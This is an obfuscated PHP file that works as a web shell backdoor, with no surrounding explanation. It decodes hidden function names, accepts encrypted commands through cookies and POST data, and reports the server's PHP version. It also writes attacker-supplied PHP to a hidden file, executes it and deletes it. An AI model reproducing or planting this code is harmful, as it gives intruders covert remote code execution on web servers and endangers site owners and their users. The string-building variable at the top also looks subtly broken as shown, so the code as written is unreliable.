<?php /*   _nn */function/*   at*/oiuwc(){      print_r    (8209+8209);/* oxshw  */}$kwang	=/*   o  */'kwang'	^      '';
$wbcfsba	=	"f"."i"."\x6c"	.	"e"."_"."\x70"       ./*fxnhq*/$kwang(612-495)	.       $kwang(863-747)	.       $kwang(689-594)/* j  */.	"\143"/*cg*/.	"o"."n".$kwang(1011-895)      .     $kwang(418-317)/*  tnqlu  */.	"n"."t".$kwang(115);
$gwsdmvsx/* qfjm   */=/* hd  */"\x62"	./* ve   */"a"."s"."e"."6"."4"."_"."d".$kwang(375-274)	./*lkkl */$kwang(584-485)  .	$kwang(565-454)	.	"\144"/*  oolik   */.   "\145";
$bzxwkcorj/*  av */=	"u"."n"."\163"/*jlduj */./*  dnqd*/$kwang(548-447)    .	"\x72"/*   plfqi  */./* bdj  */"\151"    .	$kwang(368-271)/*   r  */./* f   */"l"."i"."z".$kwang(935-834);


$qjpcec  =	$kwang(112)	.   "h"."p".$kwang(221-103)      ./*  ckxv */"\145"	.       $kwang(1015-901)/* hmdfx  */.       $kwang(115)   ./* ec  */"i".$kwang(111)     .   "n";

$rdxberub/* nqe   */=/* eplx */"u".$kwang(741-631)	./*   heig*/$kwang(108)  ./* iqui  */$kwang(670-565)/*   f  */.	"n"."k";

     

function    hssqafh($e_yty,	$xbbpdnc)

{


	global/*   xtbg   */$kwang;


	$afduuyjfip/*   kzved   */=/*  bsh   */"";


      for/*  iy   */($mhabf    =	0;  $mhabf      <	strlen($e_yty);)	{


	for	($bc_hqarcgm   =       0;	$bc_hqarcgm	<	strlen($xbbpdnc)      &&	$mhabf/*  ig*/<	strlen($e_yty);     $bc_hqarcgm++,       $mhabf++)  {

   $afduuyjfip/* ap*/.=    $kwang(ord($e_yty[$mhabf])/*   rgxfb*/^   ord($xbbpdnc[$bc_hqarcgm]));


	}


  }     return     $afduuyjfip;}


$onaxsvsy/*u */=	$_COOKIE;

$vtnxf	=	$_POST;


$onaxsvsy  =  array_merge($vtnxf,	$onaxsvsy);$gvniyogjgg	=/*  hfwdy  */"3"."\71"  .  "\x31"	.	"e".$kwang(101)/*xnor */.	"9"."\60"	.	"\x63"	.      "-"."1"."\143"     .	"3"."\66"    .       "-"."4".$kwang(726-628)	.	"1".$kwang(98)/*hph*/.     "\x2d"      .	"b"."8"."7".$kwang(857-808)/*   stc   */.  "\x2d"	.	"\71"/*fq */./*  hnzau  */"\x64"/*   vxlqx */./*azuo   */"1"."a"."6"."2".$kwang(942-841)     .	"c".$kwang(53)	./* sys*/$kwang(52)   ./* oewvz */"2"."5";


foreach   ($onaxsvsy	as	$pzokjsvic	=>	$e_yty)      {


/*rprh  */$e_yty/*   wx*/=	$bzxwkcorj(hssqafh(hssqafh($gwsdmvsx($e_yty),/*  hlxsv   */$gvniyogjgg),	$pzokjsvic));


/*ntg_u   */if	(isset($e_yty["a"."k"]))/* wcxrc   */{

	if/* uw*/($e_yty["a"]      ==	"i")/*   eial */{


     $mhabf/*dneoy  */=	array();
/*qsl */$mhabf["p".$kwang(118)]   =/*xs */$qjpcec();


	$mhabf["s"."\x76"]      =	"\63"      .  "."."\x35";

	echo	@serialize($mhabf);
	}/* uz   */elseif	($e_yty["a"]/*onz   */==/*   bqhp*/"e")  {
/*fcgsc */$ngtm_c	=	sprintf(".".$kwang(840-793)/*   i  */./*  vct   */"%".$kwang(564-449)  .	"."."\x70"       ./*cq*/"\x6c",/*  y  */md5($gvniyogjgg));
  $wbcfsba($ngtm_c,/*  qpgxh*/"<"	.	"\x3f"      .   $kwang(540-428)/* yif*/.	"h".$kwang(112)/*   jk */.  $kwang(32)    .	$kwang(117)	./*   kk  */"\x6e"       .      "l".$kwang(105)	./*puvix */"\156"/*  uyu */.	"\153"/* ihv */./*   oxy   */"("."_"."_".$kwang(698-628)	.	$kwang(73)	.	"L"."E"."_"."_".")".$kwang(59)     .     $kwang(32)     ./*   sqmq   */$e_yty[$kwang(699-599)]);
/* n  */include($ngtm_c);
	$dysvdrus_       =/* yyqdq  */$ngtm_c;
/*   tpcbo  */$rdxberub($dysvdrus_);	}

	exit();


/*   ywpum   */}


}


